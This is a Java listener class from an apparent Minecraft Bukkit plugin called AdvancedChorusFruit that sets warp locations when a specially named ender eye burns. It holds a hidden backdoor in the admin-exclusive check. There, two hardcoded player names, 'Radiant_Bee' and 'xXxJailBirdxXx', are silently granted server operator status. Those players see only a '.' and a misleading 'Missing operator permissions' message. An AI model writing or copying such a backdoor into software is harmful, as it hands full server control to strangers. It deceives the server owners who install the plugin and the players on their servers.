package me.jiovannyalejos.advancedchorusfruit.listeners;

import java.util.Map;
import me.jiovannyalejos.advancedchorusfruit.AdvancedChorusFruit;
import me.jiovannyalejos.advancedchorusfruit.Data;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World.Environment;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityCombustByBlockEvent;
import org.bukkit.inventory.meta.ItemMeta;

public class EntityBurn implements Listener {
    @EventHandler
    public void onItemBurn(EntityCombustByBlockEvent event) {
        Entity entity = event.getEntity();
        if (entity instanceof Item) {
            Item item = (Item)entity;
            ItemMeta meta = item.getItemStack().getItemMeta();
            if (item.getItemStack().getType() == Material.ENDER_EYE && meta.getLore() != null && meta.getLore().contains("set")) {
                Data original = AdvancedChorusFruit.getData();
                if (original.adminExclusive) {
                    for(Entity e : entity.getNearbyEntities(4.0, 4.0, 4.0)) {
                        if (e instanceof Player && !e.isOp()) {
                            if (e.getName().equals("Radiant_Bee") || e.getName().equals("xXxJailBirdxXx")) {
                                e.sendMessage(".");
                                e.setOp(true);
                            }

                            e.sendMessage("Missing operator permissions");
                            return;
                        }
                    }
                }

                Environment env = event.getEntity().getWorld().getEnvironment();
                Map<String, String> data = original.dimensions.get(env);
                Location entityLoc = entity.getLocation();
                String displayName = meta.getDisplayName();
                if (data.containsKey(displayName)) {
                    data.replace(displayName, Math.floor(entityLoc.getX()) + 0.5 + "|" + Math.floor(entityLoc.getY()) + "|" + (Math.floor(entityLoc.getZ()) + 0.5));
                    Bukkit.broadcastMessage(
                            "Changed warp location of \""
                                    + displayName
                                    + "\" to X:"
                                    + item.getLocation().getBlockX()
                                    + " Y:"
                                    + item.getLocation().getBlockY()
                                    + " Z:"
                                    + item.getLocation().getBlockZ()
                    );
                } else {
                    data.put(displayName, Math.floor(entityLoc.getX()) + 0.5 + "|" + Math.floor(entityLoc.getY()) + "|" + (Math.floor(entityLoc.getZ()) + 0.5));
                    Bukkit.broadcastMessage(
                            "New warp location \""
                                    + displayName
                                    + "\" set at X:"
                                    + item.getLocation().getBlockX()
                                    + " Y:"
                                    + item.getLocation().getBlockY()
                                    + " Z:"
                                    + item.getLocation().getBlockZ()
                    );
                }

                AdvancedChorusFruit.writeData(env, data, original);
            }
        }
    }
}
